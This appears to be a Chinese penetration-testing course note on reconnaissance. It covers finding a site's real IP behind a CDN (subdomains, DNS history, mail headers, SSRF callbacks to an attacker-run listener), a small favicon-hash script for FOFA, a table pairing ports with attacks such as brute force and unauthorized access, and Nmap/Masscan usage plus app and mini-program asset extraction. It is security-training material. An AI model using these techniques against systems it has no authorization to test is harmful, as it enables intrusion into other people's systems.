<p><a href="https://www.17ce.com/">https://www.17ce.com/</a></p>
<p><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p>
<p><strong>使用工具直接查询</strong></p>
<p>查询网站：<a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a></p>
<h3 id="CDN绕过技术"><a href="#CDN绕过技术" class="headerlink" title="CDN绕过技术"></a>CDN绕过技术</h3><p><strong>针对子域名未配置CDN、前期未配置过CDN记录</strong></p>
<p>识别方法</p>
<ul>
<li>子域名查询：通过未加速的子域名获取真实IP</li>
<li>历史记录查询：利用DNS历史解析记录</li>
<li>证书查询：通过SSL证书信息反查</li>
</ul>
<p>工具推荐</p>
<ul>
<li>子域名收集：DNSGrep（<a href="https://www.dnsgrep.cn)/">https://www.dnsgrep.cn）</a></li>
<li>网络空间测绘：fofa.so、quake.360.cn</li>
<li>备案查询：<a href="https://www.yunsee.cn/">https://www.yunsee.cn</a></li>
</ul>
<p><strong>针对CDN配置的加速域名范围</strong></p>
<p>绕过原理：当加速区域限定为中国内地时，海外访问请求会直连源站</p>
<p>绕过方法</p>
<ul>
<li>检查历史解析记录（DNS缓存投毒）</li>
<li>利用子域名加速配置缺陷（如bbs.baidu.com未加速）</li>
<li>国外节点请求（部分CDN未部署海外节点）</li>
</ul>
<p>工具推荐</p>
<ul>
<li>超级Ping工具：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></li>
<li>全球节点检测：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li>
<li>IP反查接口：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a></li>
</ul>
<h4 id="子域名入手"><a href="#子域名入手" class="headerlink" title="子域名入手"></a>子域名入手</h4><p>针对子域名未配置CDN、CDN配置的限定加速域名范围</p>
<p>​	1、有些站点的主站使用了CDN，或者部分域名使用了CDN，某些子域名可能未使用。</p>
<p>​	2、主站可能只配置了中国地区加速，未配置其他地区加速</p>
<p>绕过方法：</p>
<ol>
<li>使用子域名爆破，查询存在的子域名</li>
<li>使用工具进行检测<ol>
<li>超级Ping工具：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></li>
<li>全球节点检测：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li>
<li>子域名收集：DNSGrep（<a href="https://www.dnsgrep.cn)/">https://www.dnsgrep.cn）</a></li>
<li>网络空间测绘：fofa.so、quake.360.cn</li>
<li>备案查询：<a href="https://www.yunsee.cn/">https://www.yunsee.cn</a></li>
</ol>
</li>
</ol>
<h4 id="FOFA-icon-hash"><a href="#FOFA-icon-hash" class="headerlink" title="FOFA icon_hash"></a>FOFA icon_hash</h4><p>编写python</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hashico</span>(<span class="params">url</span>):</span><br><span class="line">	target=url+<span class="string">&quot;/favicon.ico&quot;</span></span><br><span class="line">	response = requests.get(url=target,verify=<span class="literal">False</span>)</span><br><span class="line">	favicon = response.content.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">	<span class="built_in">hash</span> = mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hash</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	hashico(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>



<p>使用</p>
<p><img src="/img/xiaodi/8295cf793d2392601c429a5a56115c5b.png" alt="img"></p>
<p>之后结合fofa快速定位目标相关资产：</p>
<p><img src="/img/xiaodi/f9a597a030e24dfb1e568c439c6bcfb3.png" alt="img"></p>
<h4 id="利用网站漏洞"><a href="#利用网站漏洞" class="headerlink" title="利用网站漏洞"></a>利用网站漏洞</h4><p>定义：利用网站存在的功能漏洞（如SSRF），使服务器主动向外发起请求暴露真实IP</p>
<p>典型漏洞</p>
<ul>
<li>SSRF漏洞：服务器端请求伪造，可强制服务器访问指定URL</li>
<li>远程图片加载：文章发布&#x2F;头像设置等需要加载外部资源的功能</li>
</ul>
<p>实现原理：构造特殊请求让服务器主动连接攻击者控制的监听服务器，通过访问日志获取真实IP</p>
<p><strong>注意：需要配置web服务器来接收服务器的访问</strong></p>
<h4 id="遗留文件"><a href="#遗留文件" class="headerlink" title="遗留文件"></a>遗留文件</h4><p>使用web目录结构扫描爆破、获取相关的服务器配置信息文件</p>
<ul>
<li>调试文件：phpinfo.php（SERVER_ADDR、HTTP_HOST）等包含服务器配置信息的文件</li>
<li>配置文件：web.config、.env等可能包含IP信息的文件</li>
<li>版本说明：README.md、CHANGELOG等开发文档</li>
</ul>
<p>该方法具有偶然性，依赖管理员未删除调试文件</p>
<h4 id="特殊端口-历史记录"><a href="#特殊端口-历史记录" class="headerlink" title="特殊端口&#x2F;历史记录"></a>特殊端口&#x2F;历史记录</h4><p>特殊端口：尝试访问非标准端口（如8080、8443）的服务</p>
<p>查询ip与域名绑定历史记录，可能会发现使用CDN之前的目标ip</p>
<p>历史记录：查找网站早期未使用CDN时的DNS解析记录</p>
<p>查询网站</p>
<blockquote>
<p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
<p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
<p><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a></p>
<p><a href="http://viewdns.info/">http://viewdns.info/</a></p>
<p><a href="http://www.17ce.com/">http://www.17ce.com/</a></p>
<p><a href="https://community.riskiq.com/">https://community.riskiq.com/</a></p>
<p><a href="http://www.crimeflare.com/cfssl.html">http://www.crimeflare.com/cfssl.html</a></p>
</blockquote>
<h4 id="邮件系统"><a href="#邮件系统" class="headerlink" title="邮件系统"></a>邮件系统</h4><p>寻找真实IP的原理：通过邮件系统寻找真实IP主要基于两点：一是邮件服务器通常不做CDN服务；二是邮件通信具有主动发送的特性。</p>
<p>不做CDN的原因</p>
<ul>
<li>邮件系统使用MX记录类型，而CDN服务通常只支持CNAME记录和A记录</li>
<li>部分厂商不支持MX记录做CDN加速服务</li>
</ul>
<p><strong>实现方法</strong></p>
<p>被动接收法</p>
<ul>
<li>触发网站发送邮件的功能（如找回密码、用户注册、邮件订阅等）</li>
<li>查看邮件原文中的Received字段获取发送方IP</li>
<li>示例：通过”忘记密码”功能让网站发送验证邮件</li>
</ul>
<p>主动发送法</p>
<ul>
<li>向目标域名的不存在邮箱地址发送邮件</li>
<li>接收退回邮件获取真实IP</li>
<li>注意：此方法需使用自建邮件服务器，第三方邮箱（如QQ）会屏蔽真实IP</li>
</ul>
<blockquote>
<p>有效性验证</p>
<ul>
<li>发件人邮箱必须使用目标域名（如<a href="mailto:&#x78;&#x78;&#120;&#x40;&#116;&#x61;&#114;&#103;&#101;&#x74;&#x2e;&#99;&#111;&#x6d;">&#x78;&#x78;&#120;&#x40;&#116;&#x61;&#114;&#103;&#101;&#x74;&#x2e;&#99;&#111;&#x6d;</a>）</li>
<li>不能是第三方邮箱服务（如126、QQ等）</li>
</ul>
<p>IP验证</p>
<ul>
<li>查看邮件头中的Received字段</li>
<li>确认IP是否属于目标域名所有</li>
</ul>
<p><img src="/img/xiaodi/image-20250509111110523.png" alt="image-20250509111110523"></p>
</blockquote>
<h4 id="国外查询接口"><a href="#国外查询接口" class="headerlink" title="国外查询接口"></a>国外查询接口</h4><p>通过国外得一些冷门得DNS或IP去请求目标，很多时候国内得CDN对国外得覆盖面并不是很广，故此可以利用此特点进行探测。 通过国外代理访问就能查看真实IP了，或者通过国外的DNS解析，可能就能得到真实的IP查询网站</p>
<p>IP反查接口：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p>
<p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p>
<p>IP接口合集：<a href="https://github.com/ihmily/ip-info-api">https://github.com/ihmily/ip-info-api</a></p>
<h4 id="全网扫描"><a href="#全网扫描" class="headerlink" title="全网扫描"></a>全网扫描</h4><p>定义：当常规方法无法获取真实IP时采用的终极手段，通过特殊标识符在全网寻找相似IP节点</p>
<p>成功率：完全取决于扫描范围和精度，属于”没有办法的办法”</p>
<p>类比：与”以量打量”原理相似，都是通过消耗资源来获取真实信息</p>
<ol>
<li>判断CDN厂商、备案信息</li>
<li>使用纯真IP库进行信息查询（如：阿里云）</li>
<li>使用工具对查询的IP段进行扫描<ol>
<li><a href="https://github.com/Tai7sy/fuckcdn?tab=readme-ov-file">GitHub - Tai7sy&#x2F;fuckcdn: CDN真实IP扫描，易语言开发</a><ol>
<li>扫描IP段中开放指定端口的设备（详细见github）</li>
<li>访问开放端口验证关键字</li>
<li>保存匹配结果到result.txt</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>其他工具：</p>
<p>​	<a href="https://github.com/Pluto-123/Bypass_cdn">https://github.com/Pluto-123/Bypass_cdn</a></p>
<h1 id="主机架构分析"><a href="#主机架构分析" class="headerlink" title="主机架构分析"></a>主机架构分析</h1><p>常见服务</p>
<ul>
<li>常见类型：Apache、Nginx、IIS、lighttpd等</li>
<li>应用服务器：Tomcat、Jboss、Weblogic、Websphere等</li>
<li>数据库服务：Mysql、SqlServer、Oracle、Redis、MongoDB等</li>
</ul>
<p><strong>web服务器</strong></p>
<p>识别方法</p>
<p>Server字段识别（通过HTTP响应头中的Server字段可以判断服务器类型）</p>
<ul>
<li>Server: Apache&#x2F;2.4.46 (Win32) OpenSSL&#x2F;1.1.1g mod_fcgid&#x2F;2.3.9a 表示Apache服务器</li>
<li>该方法简单直接，是识别WEB服务器最常用的方式</li>
</ul>
<p>使用指纹识别工具</p>
<p><strong>应用服务器</strong></p>
<p>​	定义: 应用服务器是中间件的一种特殊类型，主要用于支持特定语言开发的应用程序运行。</p>
<p>​	常见类型: Tomcat、Jboss、Weblogic、Websphere等，这些通常与Java应用相关。</p>
<p>与Web服务器区别</p>
<ul>
<li>端口特性: 应用服务器安装后会默认开放特定端口（如Tomcat默认8080，Weblogic默认7001），而Web服务器通常使用80&#x2F;443端口。</li>
<li>业务支持: 应用服务器针对特定语言开发的程序（如Java）有更好的支持性，例如Weblogic对Java应用的支持优于IIS。</li>
</ul>
<p>识别方法</p>
<ul>
<li>端口扫描: 必须通过端口扫描识别，无法像Web服务器那样通过浏览器返回包判断。</li>
<li>常见端口<ul>
<li>7001: Weblogic</li>
<li>8080: Jboss&#x2F;Tomcat</li>
<li>8009: Tomcat AJP协议</li>
<li>9080-9081: Websphere</li>
</ul>
</li>
</ul>
<p>​	</p>
<p><strong>数据库服务</strong></p>
<ul>
<li>关系型数据库: MySQL、SQL Server、Oracle等</li>
<li>非关系型数据库: Redis、MongoDB等</li>
<li>渗透测试关注点<ul>
<li>MySQL: 注入提权、爆破</li>
<li>Redis: 未授权访问、弱口令爆破</li>
<li>MongoDB: 爆破、未授权访问（默认端口27017）</li>
</ul>
</li>
<li>关键端口服务<ul>
<li>22&#x2F;SSH: 爆破、隧道转发</li>
<li>23&#x2F;Telnet: 路由设备弱口令</li>
<li>25&#x2F;SMTP: 邮件伪造</li>
<li>53&#x2F;DNS: 区域传送攻击</li>
<li>80-89&#x2F;Web: 中间件漏洞利用</li>
<li>11211&#x2F;Memcached: 未授权访问</li>
</ul>
</li>
</ul>
<p><strong>内网环境特征</strong></p>
<ul>
<li>业务端口部分映射到外网</li>
<li>造成”看到的≠实际的”现象</li>
<li>典型场景：<ul>
<li>Web端口80映射成功</li>
<li>数据库端口3306未映射</li>
</ul>
</li>
</ul>
<p>解决方案</p>
<ul>
<li>无直接解决办法</li>
<li>需结合其他信息收集手段</li>
<li>重要提示：扫描结果需结合架构分析</li>
</ul>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><table>
<thead>
<tr>
<th>端口&#x2F;端口范围</th>
<th>协议</th>
<th>服务&#x2F;用途</th>
<th>渗透测试用途</th>
</tr>
</thead>
<tbody><tr>
<td>20,21</td>
<td>TCP</td>
<td>FTP</td>
<td>匿名上传下载、爆破、嗅探、提权（如ProFTPd 1.3.5）、后门利用、中间人攻击（v1）、SSH隧道&#x2F;内网代理、文件传输</td>
</tr>
<tr>
<td>22</td>
<td>TCP</td>
<td>SSH</td>
<td>爆破、嗅探、路由&#x2F;交换机弱口令</td>
</tr>
<tr>
<td>23</td>
<td>TCP</td>
<td>Telnet</td>
<td>邮件伪造、VRFY&#x2F;EXPN查询用户信息（smtp-user-enum工具）</td>
</tr>
<tr>
<td>25</td>
<td>TCP</td>
<td>SMTP</td>
<td>邮件伪造、用户信息枚举</td>
</tr>
<tr>
<td>53</td>
<td>TCP&#x2F;UDP</td>
<td>DNS</td>
<td>区域传送漏洞、DNS劫持&#x2F;缓存投毒&#x2F;欺骗、DNS隧道远控</td>
</tr>
<tr>
<td>69</td>
<td>TCP&#x2F;UDP</td>
<td>TFTP</td>
<td>配置文件下载</td>
</tr>
<tr>
<td>80-89,443,8080-8089</td>
<td>TCP</td>
<td>Web服务</td>
<td>TopN漏洞、VPN&#x2F;OWA&#x2F;Webmail&#x2F;OA漏洞、中间件&#x2F;框架漏洞、Java控制台、Web管理面板、爆破&#x2F;嗅探</td>
</tr>
<tr>
<td>110</td>
<td>TCP</td>
<td>POP3</td>
<td>权限配置不当</td>
</tr>
<tr>
<td>111,2049</td>
<td>TCP</td>
<td>NFS&#x2F;Samba</td>
<td>爆破、远程执行漏洞（如MS08-067、MS17-010）、嗅探</td>
</tr>
<tr>
<td>137,139,445</td>
<td>TCP</td>
<td>SMB</td>
<td>爆破、远程执行漏洞</td>
</tr>
<tr>
<td>161</td>
<td>UDP</td>
<td>SNMP</td>
<td>默认团体字符串爆破、内网信息搜集</td>
</tr>
<tr>
<td>389</td>
<td>TCP</td>
<td>LDAP</td>
<td>注入攻击、匿名访问、弱口令爆破</td>
</tr>
<tr>
<td>512,513,514</td>
<td>TCP</td>
<td>Rexec&#x2F;Rlogin</td>
<td>Linux远程执行、匿名访问</td>
</tr>
<tr>
<td>873</td>
<td>TCP</td>
<td>Rsync</td>
<td>未授权访问、文件上传</td>
</tr>
<tr>
<td>1194</td>
<td>TCP</td>
<td>OpenVPN</td>
<td>弱口令、信息泄露、爆破</td>
</tr>
<tr>
<td>1352</td>
<td>TCP</td>
<td>Lotus</td>
<td>注入、提权</td>
</tr>
<tr>
<td>1433</td>
<td>TCP</td>
<td>SQL Server</td>
<td>SA弱口令、爆破、TNS注入、弹Shell</td>
</tr>
<tr>
<td>1521</td>
<td>TCP</td>
<td>Oracle</td>
<td>弱口令爆破</td>
</tr>
<tr>
<td>1723</td>
<td>TCP</td>
<td>PPTP</td>
<td>爆破、VPN钓鱼</td>
</tr>
<tr>
<td>2082,2083</td>
<td>TCP</td>
<td>cPanel</td>
<td>弱口令、未授权访问</td>
</tr>
<tr>
<td>2181</td>
<td>TCP</td>
<td>ZooKeeper</td>
<td>默认密码访问</td>
</tr>
<tr>
<td>2601,2604</td>
<td>TCP</td>
<td>Zebra</td>
<td>弱口令</td>
</tr>
<tr>
<td>3128</td>
<td>TCP</td>
<td>Squid</td>
<td>弱口令、Kangle代理</td>
</tr>
<tr>
<td>3306</td>
<td>TCP</td>
<td>MySQL</td>
<td>Shift后门（需Windows 2003以下）、爆破、MS12-020漏洞</td>
</tr>
<tr>
<td>3389</td>
<td>TCP</td>
<td>RDP</td>
<td>爆破、MS12-020漏洞</td>
</tr>
<tr>
<td>3690</td>
<td>TCP</td>
<td>SVN</td>
<td>SVN泄露、未授权访问</td>
</tr>
<tr>
<td>4848</td>
<td>TCP</td>
<td>GlassFish</td>
<td>爆破、注入</td>
</tr>
<tr>
<td>5000</td>
<td>TCP</td>
<td>Sybase&#x2F;DB2</td>
<td>爆破、注入、弱口令</td>
</tr>
<tr>
<td>5432</td>
<td>TCP</td>
<td>PostgreSQL</td>
<td>弱口令、注入</td>
</tr>
<tr>
<td>5900-5902</td>
<td>TCP</td>
<td>VNC</td>
<td>弱口令爆破、未授权命令执行</td>
</tr>
<tr>
<td>5984</td>
<td>TCP</td>
<td>CouchDB</td>
<td>未授权访问、弱口令爆破</td>
</tr>
<tr>
<td>6379</td>
<td>TCP</td>
<td>Redis</td>
<td>Java反序列化、弱口令</td>
</tr>
<tr>
<td>7001,7002</td>
<td>TCP</td>
<td>WebLogic</td>
<td>控制台弱口令、反序列化漏洞</td>
</tr>
<tr>
<td>7778</td>
<td>TCP</td>
<td>Kloxo</td>
<td>弱口令</td>
</tr>
<tr>
<td>8000</td>
<td>TCP</td>
<td>Ajenti</td>
<td>管理面板漏洞</td>
</tr>
<tr>
<td>8009</td>
<td>TCP</td>
<td>Tomcat AJP</td>
<td>AJP协议漏洞（如CVE-2020-1938）</td>
</tr>
<tr>
<td>8443</td>
<td>TCP</td>
<td>Plesk</td>
<td>远程执行、SQL注入</td>
</tr>
<tr>
<td>8069</td>
<td>TCP</td>
<td>Zabbix</td>
<td>反序列化、控制台弱口令</td>
</tr>
<tr>
<td>8080-8089</td>
<td>TCP</td>
<td>Jenkins&#x2F;JBoss&#x2F;WebSphere</td>
<td>反序列化、控制台弱口令</td>
</tr>
<tr>
<td>9080-9081,9090</td>
<td>TCP</td>
<td>WebSphere</td>
<td>远程执行漏洞</td>
</tr>
<tr>
<td>9200,9300</td>
<td>TCP</td>
<td>ElasticSearch</td>
<td>未授权访问</td>
</tr>
<tr>
<td>11211</td>
<td>TCP</td>
<td>Memcached</td>
<td>未授权访问、爆破</td>
</tr>
<tr>
<td>27017,27018</td>
<td>TCP</td>
<td>MongoDB</td>
<td>默认未授权访问</td>
</tr>
<tr>
<td>50070,50030</td>
<td>TCP</td>
<td>Hadoop</td>
<td>未授权访问、命令执行</td>
</tr>
</tbody></table>
<p>收集方式：</p>
<ul>
<li>主动收集：通过自身工具发送请求并分析返回信息（如Nmap、Masscan）</li>
<li>被动收集：通过第三方平台查询目标信息（如网络空间）</li>
</ul>
<p>工具分类：目前最常用的三种端口扫描工具是网络空间、Nmap和Masscan</p>
<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><ul>
<li>基本介绍：老牌安全扫描工具，提供图形化界面（Zenmap）和命令行版本</li>
<li>扫描模式<ul>
<li>Intense scan：常规扫描模式</li>
<li>Intense scan plus UDP：扫描所有TCP&#x2F;UDP端口</li>
<li>Intense scan no ping：不带ping的扫描</li>
<li>Quick scan：快速扫描模式</li>
<li>Quick scan plus：增强版快速扫描（最常用）</li>
</ul>
</li>
<li>常用参数<ul>
<li>-T4：设置扫描速度</li>
<li>-A：启用操作系统检测和版本检测</li>
<li>-v：显示详细输出</li>
<li>-sV：探测服务版本</li>
<li>-O：操作系统检测</li>
</ul>
</li>
<li>特点：扫描结果全面但耗时较长</li>
</ul>
<p>扫描状态：</p>
<ul>
<li>open：服务正在监听该端口</li>
<li>closed：端口可达但无服务监听</li>
<li>filtered：端口被防火墙&#x2F;安全设备阻断</li>
</ul>
<h3 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h3><ul>
<li>编译环境：需要使用Visual Studio进行编译</li>
<li>参考资源<ul>
<li>官方下载：<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></li>
</ul>
</li>
<li>特点：扫描速度极快，适合大规模扫描任务</li>
</ul>
<p>编译方法：</p>
<p><strong>下载源码</strong>：从GitHub下载Masscan的源码。</p>
<p><strong>安装编译器</strong>：使用Visual Studio 2019进行编译（其他版本也可，但需自行调整配置）。</p>
<p>配置编译环境</p>
<ul>
<li><p>在<code>Source Files-&gt;misc-&gt;string_s.h</code>中添加编译配置，根据编译器版本修改<code>_MSC_VER</code>的值。</p>
</li>
<li><p>选择Release模式编译</p>
</li>
<li><p>点击”生成解决方案”生成exe文件</p>
</li>
<li><p>编译输出：成功编译后在bin目录生成masscan.exe可执行文件</p>
</li>
</ul>
<p>基本语法</p>
<ul>
<li>masscan -p&lt;端口&gt; &lt;IP&gt;</li>
<li>例：masscan -p80 10.0.0.0&#x2F;8</li>
</ul>
<p>多端口扫描</p>
<ul>
<li>支持逗号分隔和范围指定</li>
<li>例：masscan -p80,8000-8100 10.0.0.0&#x2F;8</li>
</ul>
<p>结果输出</p>
<ul>
<li>-oB：二进制格式输出</li>
<li>-oX：XML格式输出</li>
</ul>
<h3 id="空间测绘平台-1"><a href="#空间测绘平台-1" class="headerlink" title="空间测绘平台"></a>空间测绘平台</h3><p>工作原理: 通过爬取互联网设备信息建立数据库</p>
<p><a href="https://quake.360.net/quake/#/index">360网络空间测绘 — 因为看见，所以安全</a></p>
<p><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p>
<p><a href="https://hunter.qianxin.com/_blank">鹰图平台(hunter)-奇安信网络空间测绘系统</a></p>
<p>1、输入端口扫描的IP</p>
<p>2、使用IP聚合</p>
<p><img src="/img/xiaodi/image-20250508205332264.png" alt="image-20250508205332264"></p>
<h1 id="APP资产"><a href="#APP资产" class="headerlink" title="APP资产"></a>APP资产</h1><h2 id="搜集APP资产"><a href="#搜集APP资产" class="headerlink" title="搜集APP资产"></a>搜集APP资产</h2><p>爱企查 </p>
<p>​	<a href="https://aiqicha.baidu.com/index/index">爱企查-工商查询_专业企业信息查询平台_公司查询_老板查询_工商信息查询系统</a></p>
<ul>
<li>查询方法：通过企业名称在知识产权栏查询软件著作权信息</li>
<li>案例演示：查询”中邮邮惠万家银行”显示3个APP：邮惠万商APP、邮惠万村app、邮惠万家银行App</li>
<li>会员获取：可在拼多多购买7天试用超级会员（1元）</li>
</ul>
<p>小蓝本</p>
<p>​	<a href="https://sou.xiaolanben.com/pc">小蓝本-商业信息搜索</a></p>
<ul>
<li>特点：免费使用，支持地区筛选</li>
<li>查询语法：关键词+空格+地区&#x3D;地区筛选</li>
<li>案例结果：查询到”邮惠万家银行”APP信息</li>
</ul>
<p>七麦数据</p>
<p>​	<a href="https://www.qimai.cn/">七麦数据 -专业移动产品商业分析平台-关键词优化-ASA优化-七麦科技</a></p>
<ul>
<li>功能：支持iOS&#x2F;安卓双平台查询</li>
<li>局限性：查询结果相对较少，需配合其他平台使用</li>
<li>会员价格：350元&#x2F;月（较贵）</li>
</ul>
<p>点点数据</p>
<p>​	<a href="https://app.diandian.com/">点点数据-App数据查询分析,AppStore排行榜,ASO,ASM优化平台</a></p>
<ul>
<li>优势：数据量最全，支持多维度分析</li>
<li>功能：可查看开发者其他应用、版本历史等</li>
<li>案例：查询”隆基绿能”发现3个相关APP</li>
</ul>
<p><strong>查询技巧</strong></p>
<ul>
<li>多平台交叉验证<ul>
<li>必要性：不同平台收录结果可能不同（如点点查到3个APP，七麦只查到2个）</li>
<li>验证方法：至少使用2个平台进行比对</li>
</ul>
</li>
<li>开发者关联查询<ul>
<li>操作路径：点击APP详情页的”开发者”信息</li>
<li>作用：可发现目标企业开发的其他关联APP</li>
</ul>
</li>
</ul>
<h2 id="从APP提取资产"><a href="#从APP提取资产" class="headerlink" title="从APP提取资产"></a>从APP提取资产</h2><h3 id="抓包提取"><a href="#抓包提取" class="headerlink" title="抓包提取"></a>抓包提取</h3><p>通过抓取APP运行时的网络数据包获取敏感信息</p>
<ul>
<li>资产信息：IP地址、域名、网站、接口等基础设施</li>
<li>泄露信息：配置密钥(k)、源码资源文件等敏感数据</li>
<li>代码信息：Java代码安全问题等程序实现细节</li>
</ul>
<p>优缺点：</p>
<ul>
<li>优点<ul>
<li>获取的数据都是实际使用的</li>
<li>没有”假阳性”结果</li>
</ul>
</li>
<li>缺点<ul>
<li>无法获取未触发的功能</li>
<li>需要人工操作可能遗漏部分功能</li>
<li>对复杂APP覆盖率有限</li>
</ul>
</li>
</ul>
<h3 id="反编译提取"><a href="#反编译提取" class="headerlink" title="反编译提取"></a>反编译提取</h3><p>逆向工程获取APP源码后提取关键信息</p>
<p>动态与静态分析</p>
<ul>
<li>静态分析<ul>
<li>定义：通过反编译APP获取源码后提取信息</li>
<li>特点：可能包含未实际使用的代码和配置</li>
</ul>
</li>
<li>动态分析<ul>
<li>定义：通过运行APP抓取实际交互数据</li>
<li>特点：只反映实际被调用的功能</li>
<li>示例：用户操作触发的网络请求</li>
</ul>
</li>
<li>关键区别<ul>
<li>静态提取可能获得未使用的”死代码”</li>
<li>动态提取只能获取实际触发的功能</li>
<li>两者提取方法和技术完全不同</li>
</ul>
</li>
</ul>
<p>优缺点：</p>
<ul>
<li>优点<ul>
<li>理论上可以获取APP所有代码</li>
<li>覆盖面更完整</li>
</ul>
</li>
<li>缺点<ul>
<li>可能提取大量无用信息</li>
<li>需要额外筛选有效数据</li>
<li>技术门槛较高</li>
</ul>
</li>
</ul>
<h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>平台分析：</p>
<ul>
<li><a href="https://www.zhihuaspace.cn:8888/">南明离火-移动安全分析平台</a></li>
</ul>
<p>工具：</p>
<p>​	<a href="https://github.com/kelvinBen/AppInfoScanner">GitHub - kelvinBen&#x2F;AppInfoScanner	</a></p>
<blockquote>
<ul>
<li>扫描Android应用的APK文件、DEX文件、需要下载的APK文件下载地址、保存需要扫描的文件的目录</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python app.py android -i &lt;Your APK File or DEX File or APK Download Url or Save File Dir&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li>扫描iOS应用的IPA文件、Mach-o文件、需要下载的IPA文件下载地址、保存需要扫描的文件目录</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python app.py ios -i &lt;Your IPA file or Mach-o File or IPA Download Url or Save File Dir&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li>扫描Web站点的文件、目录、需要缓存的站点URl</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python app.py web -i &lt;Your Web file or Save Web Dir or Web Cache Url&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>尽量搭配抓包进行补充</p>
<h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><p>推荐工具: MobSF（Mobile Security Framework）</p>
<p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">GitHub - MobSF</a></p>
<p>环境要求</p>
<ul>
<li>需本地安装（服务器安装无法进行动态调试）</li>
<li>配合逍遥模拟器使用</li>
</ul>
<p>安装流程</p>
<ul>
<li>下载所需组件</li>
<li>运行steep.bat自动配置环境</li>
<li>执行run.bat启动服务（默认8000端口）</li>
</ul>
<p>核心功能</p>
<ul>
<li><p>动态分析</p>
<ul>
<li>自动检测安卓运行时环境</li>
<li>支持活动启动、屏幕截图等基础操作</li>
</ul>
</li>
<li><p>安全测试</p>
<ul>
<li>检测证书校验机制（如根CA、公钥固定等）</li>
<li>提供绕过方案（集成Frida框架）</li>
</ul>
</li>
<li><p>流量监控</p>
<ul>
<li>捕获HTTPS明文通信</li>
<li>记录用户操作产生的请求</li>
</ul>
</li>
<li><p>调试报告</p>
<ul>
<li>包含屏幕操作记录</li>
<li>提取的域名信息（如sso域名）</li>
<li>接口调用详情（如登录请求参数）</li>
<li>安全风险分析（如SQL注入点）</li>
</ul>
</li>
<li><p>优势对比</p>
<ul>
<li>相比静态分析能获取运行时数据</li>
<li>相比单纯抓包提供更全面的调试功能</li>
<li>本地部署避免在线平台的会员限制</li>
</ul>
</li>
</ul>
<h1 id="小程序应用"><a href="#小程序应用" class="headerlink" title="小程序应用"></a>小程序应用</h1><h2 id="小程序获取"><a href="#小程序获取" class="headerlink" title="小程序获取"></a>小程序获取</h2><p><strong>主要平台</strong></p>
<ul>
<li>微信</li>
<li>支付宝</li>
<li>抖音头条</li>
<li>百度</li>
</ul>
<p><strong>小程序结构</strong></p>
<p>主体文件（必须放在根目录）</p>
<ul>
<li>app.js：入口文件，类似于Java中的main方法</li>
<li>app.json：全局配置文件</li>
<li>app.wxss：全局样式文件</li>
</ul>
<p>页面组成（每个页面由4个文件组成）</p>
<ul>
<li>xxx.js：页面逻辑</li>
<li>xxx.json：页面配置</li>
<li>xxx.wxml：页面结构</li>
<li>xxx.wxss：页面样式</li>
</ul>
<p>目录结构</p>
<ul>
<li>pages：存放页面文件</li>
<li>utils：工具类文件夹</li>
<li>project.config.json：项目配置文件</li>
<li>sitemap.json：配置小程序是否允许被索引</li>
</ul>
<p><strong>搜索方法</strong></p>
<ul>
<li>直接在平台搜索框输入关键词即可查找目标小程序</li>
<li>可搜索的内容包括：小程序名称、网站标题、备案信息等</li>
<li>示例：在微信搜索”小迪”会显示相关关键词的小程序列表</li>
</ul>
<h2 id="小程序信息收集"><a href="#小程序信息收集" class="headerlink" title="小程序信息收集"></a>小程序信息收集</h2><h3 id="抓包技术"><a href="#抓包技术" class="headerlink" title="抓包技术"></a>抓包技术</h3><p>获取小程序通信的IP或域名，为后续安全测试提供目标</p>
<ul>
<li>核心工具：使用Proxifier与Burp Suite联动</li>
</ul>
<p>Proxifier需要设置规则为监听<code>WeChatApp.exe</code></p>
<p>收集内容</p>
<ul>
<li>域名信息（如m.yht7.com）</li>
<li>API接口（如&#x2F;api&#x2F;inews&#x2F;9&#x2F;8）</li>
<li>请求参数和响应数据</li>
</ul>
<h3 id="小程序逆向"><a href="#小程序逆向" class="headerlink" title="小程序逆向"></a>小程序逆向</h3><p>文档参考</p>
